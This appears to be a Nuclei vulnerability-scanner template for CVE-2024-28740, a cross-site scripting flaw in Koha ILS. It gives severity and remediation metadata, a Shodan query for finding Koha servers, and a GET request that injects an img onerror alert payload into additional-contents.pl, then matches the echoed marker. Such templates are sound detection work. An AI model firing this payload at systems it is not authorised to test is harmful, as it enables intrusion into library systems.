id: CVE-2024-28740

info:
  name: Cross Site Scripting in Koha ILS
  author: ProjectDiscoveryAI
  severity: critical
  description: Cross Site Scripting vulnerability in Koha ILS 23.05 and before allows a remote attacker to execute arbitrary code via the additional-contents.pl component.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and account compromise.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version of Koha ILS to mitigate the vulnerability.
  reference: https://febin0x4e4a.wordpress.com/2023/01/11/xss-vulnerability-in-koha-integrated-library-system/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2024-28740
    cwe-id: CWE-79
    epss-score: 0.00115
    epss-percentile: 0.46523
    cpe: cpe:2.3:a:koha:koha:*:*:*:*:*:*:*:*
  metadata:
    vendor: koha
    product: koha
    shodan-query: cpe:"cpe:2.3:a:koha:koha"

http:
  - method: GET
    path:
      - "/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cimg+src=X+onerror=alert(%27FEBIN%27)%3E&lang=default"

    matchers:
      - type: word
        words:
          - "FEBIN"
        part: body
